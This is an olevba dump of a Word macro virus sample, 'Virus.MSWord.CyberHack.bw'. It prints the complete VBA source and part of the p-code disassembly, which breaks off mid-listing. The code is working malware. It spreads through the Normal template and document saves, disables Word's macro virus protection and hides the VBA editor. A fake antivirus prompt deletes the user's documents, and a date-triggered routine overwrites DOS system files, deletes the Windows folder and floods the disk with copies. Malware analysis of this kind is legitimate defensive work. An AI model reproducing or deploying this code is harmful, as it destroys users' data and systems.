olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.CyberHack.bw
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.CyberHack.bw - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Rey.bas 
in file: ./Virus.MSWord.CyberHack.bw - OLE stream: 'Macros/VBA/Rey'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Att. Calivent  as_99@latinmail.com (rey)
'Si Quieres Aprender Contactame
'Intercambio información, y colecciono virus de todas las marcas
Public cal1
Public cal2
Public cal3
Sub AutoOpen()
If Day(Now) = Minute(Now) Then Call Adornos
    Call Principal
End Sub
Sub FileOpen()
    Call Principal
    Dialogs(wdDialogFileOpen).Show
    Call Ocultar
    Call Copiar1
    Call Gravhack
    Call Unimoq
End Sub
Sub Ocultar()
    Moqu = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Moquegua
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
     On Error GoTo 0
End Sub
Sub Unimoq()
Application.DisplayAlerts = Moqu
End Sub
Sub Copiar1()
    On Error GoTo Jiu2
    cal1 = 0
    cal3 = False
    Set Ad = ActiveDocument
    Set NT = NormalTemplate
       If cal3 = False Then
      On Error GoTo Jit2
      Application.OrganizerCopy Source:=NT.FullName, Destination:=Ad.FullName, Name:="Rey", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=NT.FullName, Destination:=Ad.FullName, Name:="Calivent", Object:=wdOrganizerObjectProjectItems
      cal1 = 1
Jit2:
    End If
Jiu2:
End Sub
Sub Copiar2()
    Call Moquegua
    On Error GoTo Jiu1
    cal2 = False
    Set Ad = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Jit1a
    For i = 1 To NT.VBProject.VBComponents.Count
      NMacr = NT.VBProject.VBComponents(i).Name
    Next i
Jit1a:
    If cal2 = False Then
      On Error GoTo Jit1
      Application.OrganizerCopy Source:=Ad.FullName, Destination:=NT.FullName, Name:="Rey", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=Ad.FullName, Destination:=NT.FullName, Name:="Calivent", Object:=wdOrganizerObjectProjectItems
      Templates(NT.FullName).Save
Jit1:
    End If
Jiu1:
End Sub
Sub Principal()
    Call Ocultar
    Call Copiar2
    Call Unimoq
End Sub
Sub Moquegua()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Gravhack()
    On Error GoTo Jit4
Set Ad = ActiveDocument
    If cal1 = 1 Then
       Ad.SaveAs FileName:=Ad.Name, FileFormat:=wdFormatDocument
    End If
Jit4:
End Sub
Sub AutoClose()
    Call Ocultar
    Call Copiar2
    Call Copiar1
    Call Unimoq
    ActiveDocument.SaveAs
    Call Principal
 End Sub
Sub FileClose()
    Call Ocultar
    Call Copiar2
    Call Copiar1
    Call Unimoq
   ActiveDocument.SaveAs
   Call Principal
   Call Sys
   End Sub
Sub FileSaveAs()
    Call Ocultar
    Call Copiar2
    Call Copiar1
    Call Unimoq
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub HelpAbout()
    On Error GoTo Jiu3
      Calivent.Show
Jiu3:
Call Principal
Call Gusto
End Sub
Sub HerramMacro()
    On Error GoTo Jiu3
    Calivent.Show
Application.OnTime Now + TimeValue("00:30:02"), "adornos"
Jiu3:
    Call Principal
End Sub
Sub FileExit()
    Call Ocultar
    Call Copiar2
    Call Copiar1
    On Error GoTo Jiu4
    If WeekDay(Date) = 5 Then Calivent.Show
Jiu4:
    Call Unimoq
    WordBasic.FileExit
End Sub
Sub ToolsCustomize()
On Error Resume Next
Call Principal
End Sub
Sub ToolsCustomizeKeyboard()
    On Error Resume Next
    Call Principal
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call Principal
End Sub
Sub FileNew()
    Call Principal
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
On Error Resume Next
Call Principal
End Sub
Sub ViewVBCode()
Calivent.Show
    Call Principal
End Sub
Sub Organizer()
Call Sys
End Sub
Public Sub Adornos()
On Error Resume Next
Documents.Add
ActiveDocument.Background.Fill.ForeColor.RGB = RGB(0, 0, 0)
    ActiveDocument.Background.Fill.Visible = msoTrue
    ActiveDocument.Background.Fill.Solid
    ActiveWindow.View.Type = wdOnlineView
    With Selection.Font
        .Name = "Arial Black"
        .Size = 25
        .Bold = True
        .ColorIndex = wdRed
       End With
    Selection.TypeText Text:="SOY EL ANGEL GABRIEL escribir a as_99@latinmail.com .. miras 24 Minutos? te lo recomiendo"
    Selection.MoveLeft Unit:=wdCharacter, Count:=8, Extend:=wdExtend
      ActiveDocument.SaveAs
End Sub
Sub Borrico()
On Error GoTo novirin
Dim Mensaje, Estilo, Título, ayuda, Ctxt, Respuesta, MiCadena
Mensaje = "Se ha Detectado virus W00/Rey" + Chr(13) + "en tu Sistema Deseas Eliminarlo " ' Define el mensaje.
Estilo = vbYesNo + vbCritical + vbDefaultButton2
Título = "@Antivirus@...Detección Heuristica"
Ctxt = 1000
Respuesta = MsgBox(Mensaje, Estilo, Título, ayuda, Ctxt)
If Respuesta = vbYes Then
    On Error GoTo noborr
    If Tasks.Exists("C:\Misdoc~1\*.doc") = True Then
       Kill ("c:\Misdoc~1\*.doc")
    End If
mens = "No se Puede Eliminar Rey" + Chr(13) + "Tu Maquina Está en Cuarentena"
    nosepuede = MsgBox(mens, vbCritical, Título)
noborr:
Else
   If Documents.Count >= 1 Then
         With Selection.Font
            .Name = "Arial"
            .Size = 8
        End With
        Selection.TypeText Text:="Tienes Virus!!!!"
        With Selection.Font
            .Name = "Times New Roman"
            .Size = 30
        End With
        Selection.TypeText Text:="....Rey"
    End If
End If
novirin:
End Sub
Sub Sys()
     If Day(Now) = Minute(Now) Then GoTo you
     If Day(Now()) = 13 And Month(Now()) = 5 Then
you:
        On Error Resume Next
        If Tasks.Exists("C:\windows\ACCESO.EXE") = True Then GoTo Inmune:
        o = MsgBox("Te fregaste loco, Ya no hay cura porguúusto¡", 0, "Tu sistema loco!!")
        SetAttr "C:\IO.SYS", 0
        Open "C:\IO.SYS" For Output As #1
        Print #1, "Viva el Perú Carajo"
        Close #1
        SetAttr "C:\MSDOS.SYS", 0
        Open "C:\MSDOS.SYS" For Output As #1
        Print #1, "Viva el Perú Carajo"
        Close #1
        SetAttr "C:\COMMAND.COM", 0
        Open "C:\COMMAND.COM" For Output As #1
        Print #1, "Viva el Moquegua Carajo"
        Close #1
        On Error GoTo 0
        On Error Resume Next
        System.privateprofilesstring("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Prog. Edwing Gabriel"
        System.privateprofilesstring("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "Calivent"
Inmune:
    If Documents.Count >= 1 Then
             With Selection.Font
            .Name = "Times New Roman"
            .Size = 30
             End With
             Selection.TypeText Text:="24 minutos "
    End If
        ActiveDocument.PrintOut Range:=wdPrintCurrentPage
        Kill "C:\windows\*.*"
    End If
End Sub
Sub Gusto()
On Error Resume Next
Dim ArchOrigen, ArchDestino
If Documents.Count >= 1 Then
    ArchOrigen = ActiveDocument.Path & Application.PathSeparator & ActiveDocument.Name
    ActiveWindow.Close SaveChanges:=wdSaveChanges ' cerrar docu
    Randomize
    For archiv0 = 1 To 50
    ext = Str(Int(2 * Rnd) + 1)
    If ext = 1 Then exte = "1.doc"
    If ext = 2 Then exte = "1.dot"
        ArchDestino = "c:\Calivent" + Str(Int(2000 * Rnd) + 1) + exte
   FileCopy ArchOrigen, ArchDestino
    SetAttr ArchDestino, vbReadOnly
    Next archiv0
Else
    aor = "c:\windows\win.ini"
    Randomize
    For archiv = 1 To 1000
        On Error Resume Next
        dest = "c:\" + Chr(Int(255 * Rnd) + 1) + _
        Chr(Int(254 * Rnd) + 1) + _
        Chr(Int(253 * Rnd) + 1) + _
        Chr(Int(252 * Rnd) + 1) + _
        Chr(Int(251 * Rnd) + 1) + _
        Chr(Int(250 * Rnd) + 1) + ".sys"
       FileCopy aor, dest: SetAttr dest, vbReadOnly
    Next
End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO Calivent.frm 
in file: ./Virus.MSWord.CyberHack.bw - OLE stream: 'Macros/VBA/Calivent'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 









Private Sub Aceptar_Click()
Unload Me
End
End Sub

Private Sub cancelar_Click()
Call Borrico
End Sub

Private Sub Frame1_Click()

End Sub

Private Sub Image1_Click()
On Error Resume Next
Título = "Calivent-hack es de Unimoq"
Mensaje = "Ingrese la contraseña de autoeliminación luego su Maquina quedara limpia de virus.                                      Y si quieres Virus o información yo te la daré edcali@mixmail.com"
Pred = "Chino, Chino, Chino... al 2005 y kenyi al 2010"
valor = InputBox(Mensaje, Título, Pred)
If valor = "Edwing Gabriel" Then
    MsgBox "eliminado"
End If
End Sub

Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.CyberHack.bw
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Rey - 18433 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0028 "Att. Calivent  as_99@latinmail.com (rey)"
' Line #1:
' 	QuoteRem 0x0000 0x001E "Si Quieres Aprender Contactame"
' Line #2:
' 	QuoteRem 0x0000 0x003F "Intercambio información, y colecciono virus de todas las marcas"
' Line #3:
' 	Dim (Public) 
' 	VarDefn cal1
' Line #4:
' 	Dim (Public) 
' 	VarDefn cal2
' Line #5:
' 	Dim (Public) 
' 	VarDefn cal3
' Line #6:
' 	FuncDefn (Sub AutoOpen())
' Line #7:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Adornos 0x0000 
' 	EndIf 
' Line #8:
' 	ArgsCall (Call) Principal 0x0000 
' Line #9:
' 	EndSub 
' Line #10:
' 	FuncDefn (Sub FileOpen())
' Line #11:
' 	ArgsCall (Call) Principal 0x0000 
' Line #12:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #13:
' 	ArgsCall (Call) Ocultar 0x0000 
' Line #14:
' 	ArgsCall (Call) Copiar1 0x0000 
' Line #15:
' 	ArgsCall (Call) Gravhack 0x0000 
' Line #16:
' 	ArgsCall (Call) Unimoq 0x0000 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Sub Ocultar())
' Line #19:
' 	Ld Application 
' 	MemLd DisplayAlerts 
' 	St Moqu 
' Line #20:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #21:
' 	ArgsCall (Call) Moquegua 0x0000 
' Line #22:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #23:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #24:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #25:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #26:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #27:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #28:
' 	OnError (GoTo 0) 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub Unimoq())
' Line #31:
' 	Ld Moqu 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Sub Copiar1())
' Line #34:
' 	OnError Jiu2 
' Line #35:
' 	LitDI2 0x0000 
' 	St cal1 
' Line #36:
' 	LitVarSpecial (False)
' 	St cal3 
' Line #37:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Ad 
' Line #38:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #39:
' 	Ld cal3 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #40:
' 	OnError Jit2 
' Line #41:
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Ad 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "Rey"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #42:
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Ad 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Calivent"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #43:
' 	LitDI2 0x0001 
' 	St cal1 
' Line #44:
' 	Label Jit2 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Label Jiu2 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub Copiar2())
' Line #49:
' 	ArgsCall (Call) Moquegua 0x0000 
' Line #50:
' 	OnError Jiu1 
' Line #51:
' 	LitVarSpecial (False)
' 	St cal2 
' Line #52:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Ad 
' Line #53:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #54:
' 	OnError Jit1a 
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #56:
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	Label Jit1a 
' Line #59:
' 	Ld cal2 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	OnError Jit1 
' Line #61:
' 	Ld Ad 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0003 "Rey"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #62:
' 	Ld Ad 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Calivent"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #63:
' 	Ld NT 
' 	MemLd FullName 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #64:
' 	Label Jit1 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	Label Jiu1 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub Principal())
' Line #69:
' 	ArgsCall (Call) Ocultar 0x0000 
' Line #70:
' 	ArgsCall (Call) Copiar2 0x0000 
' Line #71:
' 	ArgsCall (Call) Unimoq 0x0000 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Sub Moquegua())
' Line #74:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #75:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #76:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #77:
' 	EndWith 
' Line #78:
' 	EndSub 
' Line #79:
' 	FuncDefn (Sub Gravhack())
' Line #80:
' 	OnError Jit4 
' Line #81:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Ad 
' Line #82:
' 	Ld cal1 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #83:
' 	Ld Ad 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld Ad 
' 	ArgsMemCall SaveAs 0x0002 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	Label Jit4 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub AutoClose())
' Line #88:
' 	ArgsCall (Call) Ocultar 0x0000 
' Line #89:
' 	ArgsCall (Call) Copiar2 0x0000 
' Line #90:
' 	ArgsCall (Call) Copiar1 0x0000 
' Line #91:
' 	ArgsCall (Call) Unimoq 0x0000 
' Line #92:
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0000 
' Line #93:
' 	ArgsCall (Call) Principal 0x0000 
' Line #94:
' 	EndSub 
' Line #95:
' 	FuncDefn (Sub FileClose())
' Line #96:
' 	ArgsCall (Call) Ocultar 0x0000 
' Line #97:
' 	ArgsCall (Call) Copiar2 0x0000 
' Line #98:
' 	ArgsCall (Call) Copiar1 0x0000 
' Line #99:
' 	ArgsCall (Call) Unimoq 0x0000 
' Line #100:
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0000 
' Line #101:
' 	ArgsCall (Call) Principal 0x0000 
' Line #102:
' 	ArgsCall (Call) Sys 0x0000 
' Line #103:
' 	EndSub 
' Line #104:
' 	FuncDefn (Sub FileSaveAs())
' Line #105:
' 	ArgsCall (Call) Ocultar 0x0000 
' Line #106:
' 	ArgsCall (Call) Copiar2 0x0000 
' Line #107:
' 	ArgsCall (Call) Copiar1 0x0000 
' Line #108:
' 	ArgsCall (Call) Unimoq 0x0000 
' Line #109:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #110:
' 	EndSub 
' Line #111:
' 	FuncDefn (Sub HelpAbout())
' Line #112:
' 	OnError Jiu3 
' Line #113:
' 	Ld Calivent 
' 	ArgsMemCall Show 0x0000 
' Line #114:
' 	Label Jiu3 
' Line #115:
' 	ArgsCall (Call) Principal 0x0000 
' Line #116:
' 	ArgsCall (Call) Gusto 0x0000 
' Line #117:
' 	EndSub 
' Line #118:
' 	FuncDefn (Sub HerramMacro())
' Line #119:
' 	OnError Jiu3 
' Line #120:
' 	Ld Calivent 
' 	ArgsMemCall Show 0x0000 
' Line #121:
' 	Ld Now 
' 	LitStr 0x0008 "00:30:02"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0007 "adornos"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #122:
' 	Label Jiu3 
' Line #123:
' 	ArgsCall (Call) Principal 0x0000 
' Line #124:
' 	EndSub 
' Line #125:
' 	FuncDefn (Sub FileExit())
' Line #126:
' 	ArgsCall (Call) Ocultar 0x0000 
' Line #127:
' 	ArgsCall (Call) Copiar2 0x0000 
' Line #128:
' 	ArgsCall (Call) Copiar1 0x0000 
' Line #129:
' 	OnError Jiu4 
' Line #130:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Calivent 
' 	ArgsMemCall Show 0x0000 
' 	EndIf 
' Line #131:
' 	Label Jiu4 
' Line #132:
' 	ArgsCall (Call) Unimoq 0x0000 
' Line #133:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #134:
' 	EndSub 
' Line #135:
' 	FuncDefn (Sub ToolsCustomize())
' Line #136:
' 	OnError (Resume Next) 
' Line #137:
' 	ArgsCall (Call) Principal 0x0000 
' Line #138:
' 	EndSub 
' Line #139:
' 	FuncDefn (Sub ToolsCustomizeKeyboard())
' Line #140:
' 	OnError (Resume Next) 
' Line #141:
' 	ArgsCall (Call) Principal 0x0000 
' Line #142:
' 	EndSub 
' Line #143:
' 	FuncDefn (Sub ToolsOptions())
' Line #144:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #145:
' 	ArgsCall (Call) Principal 0x0000 
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub FileNew())
' Line #148:
' 	ArgsCall (Call) Principal 0x0000 
' Line #149:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Sub FileTemplates())
' Line #152:
' 	OnError (Resume Next) 
' Line #153:
' 	ArgsCall (Call) Principal 0x0000 
' Line #154:
' 	EndSub 
' Line #155:
' 	FuncDefn (Sub ViewVBCode())
' Line #156:
' 	Ld Calivent 
' 	ArgsMemCall Show 0x0000 
' Line #157:
' 	ArgsCall (Call) Principal 0x0000 
' Line #158:
' 	EndSub 
' Line #159:
' 	FuncDefn (Sub Organizer())
' Line #160:
' 	ArgsCall (Call) Sys 0x0000 
' Line #161:
' 	EndSub 
' Line #162:
' 	FuncDefn (Public Sub Adornos())
' Line #163:
' 	OnError (Resume Next) 
' Line #164:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #165:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #166:
' 	Ld msoTrue 
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #167:
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #168:
' 	Ld wdOnlineView 
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #169:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #170:
' 	LitStr 0x000B "Arial Black"
' 	MemStWith New 
' Line #171:
' 	LitDI2 0x0019 
' 	MemStWith Size 
' Line #172:
' 	LitVarSpecial (True)
' 	MemStWith Bold 
' Line #173:
' 	Ld wdRed 
' 	MemStWith ColorIndex 
' Line #174:
' 	EndWith 
' Line #175:
' 	LitStr 0x0059 "SOY EL ANGEL GABRIEL escribir a as_99@latinmail.com .. miras 24 Minutos? te lo recomiendo"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #176:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0008 
' 	ParamNamed Count 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	Ld Selection 
' 	ArgsMemCall MoveLeft 0x0003 
' Line #177:
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0000 
' Line #178:
' 	EndSub 
' Line #179:
' 	FuncDefn (Sub Borrico())
' Line #180:
' 	OnError novirin 
' Line #181:
' 	Dim 
' 	VarDefn Mensaje
' 	VarDefn Estilo
' 	VarDefn Título
' 	VarDefn ayuda
' 	VarDefn Ctxt
' 	VarDefn Respuesta
' 	VarDefn MiCadena
' Line #182:
' 	LitStr 0x001D "Se ha Detectado virus W00/Rey"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0020 "en tu Sistema Deseas Eliminarlo "
' 	Add 
' 	St Mensaje 
' 	QuoteRem 0x0059 0x0013 " Define el mensaje."
' Line #183:
' 	Ld vbYesNo 
' 	Ld vbCritical 
' 	Add 
' 	Ld vbDefaultButton2 
' 	Add 
' 	St Estilo 
' Line #184:
' 	LitStr 0x0022 "@Antivirus@...Detección Heuristica"
' 	St Título 
' Line #185:
' 	LitDI2 0x03E8 
' 	St Ctxt 
' Line #186:
' 	Ld Mensaje 
' 	Ld Estilo 
' 	Ld Título 
' 	Ld ayuda 
' 	Ld Ctxt 
' 	ArgsLd MsgBox 0x0005 
' 	St Respuesta 
' Line #187:
' 	Ld Respuesta 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #188:
' 	OnError noborr 
' Line #189:
' 	LitStr 0x0011 "C:\Misdoc~1\*.doc"
' 	Ld Tasks 
' 	ArgsMemLd Exists 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #190:
' 	LitStr 0x0011 "c:\Misdoc~1\*.doc"
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #191:
' 	EndIfBlock 
' Line #192:
' 	LitStr 0x0018 "No se Puede Eliminar Rey"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001D "Tu Maquina Está en Cuarentena"
' 	Add 
' 	St mens 
' Line #193:
' 	Ld mens 
' 	Ld vbCritical 
' 	Ld Título 
' 	ArgsLd MsgBox 0x0003 
' 	St nosepuede 
' Line #194:
' 	Label noborr 
' Line #195:
' 	ElseBlock 
' Line #196:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #197:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #198:
' 	LitStr 0x0005 "Arial"
' 	MemStWith New 
' Line #199:
' 	LitDI2 0x0008 
' 	MemStWith Size 
' Line #200:
' 	EndWith 
' Line #201:
' 	LitStr 0x0010 "Tienes Virus!!!!"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #202:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #203:
' 	LitStr 0x000F "Times New Roman"
' 	MemStWith New 
' Line #204:
' 	LitDI2 0x001E 
' 	MemStWith Size 
' Line #205:
' 	EndWith 
' Line #206:
' 	LitStr 0x0007 "....Rey"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #207:
' 	EndIfBlock 
' Line #208:
' 	EndIfBlock 
' Line #209:
' 	Label novirin 
' Line #210:
' 	EndSub 
' Line #211:
' 	FuncDefn (Sub Sys())
' Line #212:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo you 
' 	EndIf 
' Line #213:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #214:
' 	Label you 
' Line #215:
' 	OnError (Resume Next) 
' Line #216:
' 	LitStr 0x0015 "C:\windows\ACCESO.EXE"
' 	Ld Tasks 
' 	ArgsMemLd Exists 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Inmune 
' 	BoS 0x0000 
' 	EndIf 
' Line #217:
' 	LitStr 0x002C "Te fregaste loco, Ya no hay cura porguúusto¡"
' 	LitDI2 0x0000 
' 	LitStr 0x0011 "Tu sistema loco!!"
' 	ArgsLd MsgBox 0x0003 
' 	St o 
' Line #218:
' 	LitStr 0x0009 "C:\IO.SYS"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #219:
' 	LitStr 0x0009 "C:\IO.SYS"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #220:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Viva el Perú Carajo"
' 	PrintItemNL 
' Line #221:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #222:
' 	LitStr 0x000C "C:\MSDOS.SYS"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #223:
' 	LitStr 0x000C "C:\MSDOS.SYS"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #224:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Viva el Perú Carajo"
' 	PrintItemNL 
' Line #225:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #226:
' 	LitStr 0x000E "C:\COMMAND.COM"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #227:
' 	LitStr 0x000E "C:\COMMAND.COM"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #228:
' 	LitDI2 0x0001 
